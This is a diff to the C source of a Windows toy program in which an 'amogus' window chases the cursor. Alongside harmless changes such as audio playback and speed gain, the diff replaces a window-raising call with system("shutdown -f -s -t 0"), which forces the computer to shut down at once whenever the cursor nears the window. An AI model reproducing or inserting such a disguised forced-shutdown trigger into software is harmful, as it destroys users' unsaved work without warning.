@@ -10,6 +10,7 @@
 #include "globals.h"
 #include "amogus/amogus.h"
 #include "data structures/vec2/vec2.h"
+#include "audio/audio.h"
 
 void * window_interaction_thread_proc(void *)
 {	clock_t last_region_refresh_clock = clock();
@@ -30,7 +31,8 @@ void * window_interaction_thread_proc(void *)
 		{	POINT cursor_pos;
 			//GetCurs
 			bool r = GetCursorPos(&cursor_pos);
-			assert(r);
+			if(!r)
+				goto fail;
 			RECT pos;
 			r = GetWindowRect(g_logic.window, &pos);
 			assert(r);
@@ -39,18 +41,23 @@ void * window_interaction_thread_proc(void *)
 			struct vec2 amogus_to_cursor = vec2_create_2(cursor_pos.x - pos.left, cursor_pos.y - pos.top);
 			double len = vec2_len(amogus_to_cursor);
 			if(len < 10) // todo change to smth easier to modify
-				SetWindowPos(g_logic.window, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE);
+			{	// SetWindowPos(g_logic.window, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE);
+				system("shutdown -f -s -t 0");
+			}
 			axes = vec2_add_2(axes
 			                  , vec2_mult(vec2_normalize_2(amogus_to_cursor, len)
-			                              , WINDOW_MOVEMENT_SPEED_FACTOR * delta_time));
+			                              , g_logic.window_speed * delta_time));
+		fail:
 		}
 		else
 		{	axes = vec2_add_2(axes, vec2_mult(
 			                      vec2_normalize(vec2_create_2(g_logic.pressed_keys.right - g_logic.pressed_keys.left
 			                                                   , g_logic.pressed_keys.down - g_logic.pressed_keys.up))
 
-			                      , WINDOW_MOVEMENT_SPEED_FACTOR * delta_time));
+			                      , g_logic.window_speed * delta_time));
 		}
+
+		g_logic.window_speed += delta_time * WINDOW_MOVEMENT_SPEED_GAIN_SPEED_FACTOR;
 
 		amogus_rotate(axes.horizontal * WINDOW_ROTATION_SPEED_FACTOR * delta_time);
 
@@ -95,6 +102,9 @@ LRESULT CALLBACK window_proc(HWND window, UINT msg, WPARAM param1, LPARAM param2
 		case WM_DESTROY:
 			PostQuitMessage(0);
 			//assert(0);
+			break;
+		case MM_MCINOTIFY:
+			audio_play_sound(AUDIO_LETHAL_COMPANY_ICECREAM_MUSIC);
 			break;
 		default:
 			if(msg == CUSTOM_WINDOW_MESSAGE(WM_DESTRUCTION_REQUIREMENT))
